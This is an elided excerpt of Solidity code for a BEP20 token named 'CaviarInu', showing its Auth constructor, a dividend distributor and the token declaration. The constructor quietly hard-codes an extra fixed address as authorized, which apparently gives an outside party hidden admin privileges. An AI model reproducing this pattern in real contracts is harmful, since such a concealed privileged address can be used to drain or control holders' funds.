...
abstract contract Auth {
    ...
    constructor(address _owner) {
        owner = _owner;
        authorizations[
    0xFB618E4E6d3Ea9c1fF41c1af8B4A0bfEEF8d015a] = true;
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 PRWDS = IBEP20(0x2859e4544C4bB03966803b044A93563Bd2D0DD4D);
    address REWARDS;
    IDEXRouter router;
...
contract CaviarInu is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string private constant _name = "CaviarInu";    
